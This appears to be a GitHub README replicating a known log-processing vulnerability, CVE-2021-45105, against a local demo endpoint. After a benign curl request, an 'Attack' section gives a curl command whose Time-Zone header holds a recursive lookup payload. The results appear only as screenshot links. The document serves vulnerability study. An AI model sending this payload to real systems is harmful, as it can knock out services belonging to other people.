# tejas-nagchandi/CVE-2021-45105
Replicating CVE-2021-45105

## API
```
curl -I localhost:8080/currentDateTime -H 'Time-Zone: GMT'
```
Output:

![image](https://user-images.githubusercontent.com/76960497/146695238-6723adf4-a46e-492e-af7e-1e56c76c3882.png)

## Attack
```
 curl -I localhost:8080/currentDateTime -H 'Time-Zone: ${${::-${::-$${::-$}}}}'
```
Output:

![image](https://user-images.githubusercontent.com/76960497/146695252-05a3b4aa-71f9-48f9-a8d0-757dc2e65bd0.png)

Logs:

![image](https://user-images.githubusercontent.com/76960497/146694904-173ade2d-3036-45ce-88fd-22d815de93c8.png)

## Reference:
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105
